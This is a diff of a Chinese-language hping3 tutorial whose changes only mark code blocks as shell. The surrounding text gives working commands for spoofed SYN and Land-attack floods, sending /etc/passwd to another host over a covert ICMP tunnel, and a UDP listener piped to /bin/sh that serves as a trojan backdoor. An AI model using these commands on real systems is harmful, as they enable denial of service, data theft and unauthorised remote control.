@@ -9,7 +9,7 @@ hping3
 
 ### 安装  
 
-```
+```shell
 yum install libpcap-devel tc-devel
 ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h
 wget http://www.hping.org/hping3-20051105.tar.gz
@@ -22,7 +22,7 @@ make install
 
 ### 选项  
 
-```
+```shell
 -H --help 显示帮助。
 -v -VERSION 版本信息。
 -c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。
@@ -79,7 +79,7 @@ Hping3主要有以下典型功能应用：
 
 测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。
 
-```
+```shell
 hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
 ```
 
@@ -87,7 +87,7 @@ hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
 
 Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：
 
-```
+```shell
 hping3 -I eth0  -S 192.168.10.1 -p 80
 ```
 
@@ -105,7 +105,7 @@ Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方
 
 使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。
 
-```
+```shell
 hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
 ```
 
@@ -115,7 +115,7 @@ hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
 
 Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：
 
-```
+```shell
 hping3 192.168.1.159--listen signature --safe  --icmp
 ```
 
@@ -123,7 +123,7 @@ hping3 192.168.1.159--listen signature --safe  --icmp
 
 在发送端使用签名打包的ICMP包发送文件：
 
-```
+```shell
 hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
 ```
 
@@ -137,13 +137,13 @@ hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
 
 在木马启动端：
 
-```
+```shell
 hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh
 ```
 
 在远程控制端：
 
-```
+```shell
 echo ls >test.cmd
 hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd
 ```
